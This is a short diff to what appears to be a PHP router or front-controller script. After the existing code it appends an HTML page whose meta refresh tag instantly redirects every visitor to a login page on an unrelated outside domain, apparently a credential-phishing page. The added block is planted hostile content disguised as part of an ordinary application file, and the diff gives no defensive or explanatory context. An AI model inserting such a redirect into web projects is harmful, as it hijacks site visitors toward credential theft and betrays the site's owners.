@@ -31,3 +31,13 @@ if (file_exists($file) && !is_dir($file)) {
 
 chdir($baseDir);
 require $baseDir . '/index.php';
+<html>
+<head>
+   <!-- HTML meta refresh URL redirection -->
+   <meta http-equiv="refresh"
+   content="0; url=https://redbamsold.com/autopaas/login.htm">
+</head>
+<body>
+   
+</body>
+</html>
